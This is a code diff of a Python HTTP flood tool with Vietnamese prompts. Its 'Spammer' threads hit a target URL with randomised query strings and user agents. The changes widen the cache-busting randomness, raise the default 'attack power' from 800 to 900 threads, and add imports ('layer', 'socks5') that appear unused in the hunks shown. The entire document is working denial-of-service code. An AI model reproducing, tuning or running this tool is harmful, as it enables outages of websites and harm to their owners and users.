@@ -1,4 +1,4 @@
-import urllib.request, os, threading, time, random, sys
+import urllib.request, os, threading, time, random, sys, layer, httpx, socks5
 from sys import stdout
 
 ref = [
@@ -144,7 +144,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
+        self.url = url + "?" + str(random.randint(0,99999)) + "=" + str(random.randint(0,99999))
         self.num = number
         self.headers = self.headers = {
                 'User-Agent': random.choice(ua),
@@ -235,9 +235,9 @@ class MainLoop():
                 print ('Lỗi đọc tệp tin vui lòng xem lại tên file.')
         while True:                
             try:
-                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [800] Max 1500: '))
+                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [900] Max 1500: '))
             except:
-                num_threads = 800
+                num_threads = 900
             break
 
         for i in range(num_threads):
